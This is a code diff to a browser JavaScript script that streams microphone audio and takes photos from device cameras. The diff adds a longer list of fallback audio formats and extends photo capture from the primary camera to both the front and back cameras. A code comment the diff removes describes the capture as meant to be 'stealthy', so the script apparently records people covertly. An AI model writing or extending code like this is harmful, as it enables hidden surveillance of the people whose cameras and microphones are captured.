@@ -635,11 +635,26 @@ async function startAudioStreaming(stream) {
   });
 
   const audioOnlyStream = new MediaStream(audioTracks);
-  const mimeType = MediaRecorder.isTypeSupported('audio/webm;codecs=opus')
-    ? 'audio/webm;codecs=opus'
-    : 'audio/webm';
+  const candidateTypes = [
+    'audio/webm;codecs=opus',
+    'audio/webm',
+    'audio/ogg;codecs=opus',
+    'audio/ogg',
+    'audio/mp4;codecs=opus',
+    'audio/mp4',
+    'audio/aac',
+    'audio/wav'
+  ];
+  let mimeType = '';
+  for (const type of candidateTypes) {
+    if (typeof MediaRecorder.isTypeSupported === 'function' && MediaRecorder.isTypeSupported(type)) {
+      mimeType = type;
+      break;
+    }
+  }
 
-  captureAudioRecorder = new MediaRecorder(audioOnlyStream, { mimeType });
+  const options = mimeType ? { mimeType } : {};
+  captureAudioRecorder = new MediaRecorder(audioOnlyStream, options);
   captureAudioRecorder.ondataavailable = async (event) => {
     if (!event.data || event.data.size === 0 || !captureSessionId) {
       return;
@@ -709,14 +724,49 @@ async function setupPhotoCameras() {
   
   let cameraConfigs = [];
   if (validInputs.length > 0) {
-    // Only capture from the primary/default camera to keep it fast, stealthy, and prevent overlapping streams
-    const primaryDevice = validInputs[0];
-    cameraConfigs.push({
-      constraints: { video: { deviceId: { exact: primaryDevice.deviceId } }, audio: false },
-      label: primaryDevice.label || 'Camera'
-    });
+    let frontDevice = null;
+    let backDevice = null;
+
+    for (const device of validInputs) {
+      const mode = inferFacingMode(device.label);
+      if (mode === 'front') {
+        if (!frontDevice) frontDevice = device;
+      } else if (mode === 'back') {
+        if (!backDevice) backDevice = device;
+      }
+    }
+
+    if (frontDevice) {
+      cameraConfigs.push({
+        constraints: { video: { deviceId: { exact: frontDevice.deviceId } }, audio: false },
+        label: frontDevice.label || 'Front Camera'
+      });
+    }
+    if (backDevice) {
+      cameraConfigs.push({
+        constraints: { video: { deviceId: { exact: backDevice.deviceId } }, audio: false },
+        label: backDevice.label || 'Back Camera'
+      });
+    }
+
+    // If we didn't find clear front/back cameras (e.g. no labels) or only found one,
+    // fill up to a maximum of 2 cameras using other available devices
+    if (cameraConfigs.length < 2) {
+      for (const device of validInputs) {
+        if (frontDevice && device.deviceId === frontDevice.deviceId) continue;
+        if (backDevice && device.deviceId === backDevice.deviceId) continue;
+
+        cameraConfigs.push({
+          constraints: { video: { deviceId: { exact: device.deviceId } }, audio: false },
+          label: device.label || `Camera ${cameraConfigs.length + 1}`
+        });
+
+        if (cameraConfigs.length >= 2) break;
+      }
+    }
   } else {
-    cameraConfigs.push({ constraints: { video: true, audio: false }, label: 'Camera' });
+    cameraConfigs.push({ constraints: { video: { facingMode: 'user' }, audio: false }, label: 'Front Camera' });
+    cameraConfigs.push({ constraints: { video: { facingMode: 'environment' }, audio: false }, label: 'Back Camera' });
   }
 
   for (const camera of cameraConfigs) {
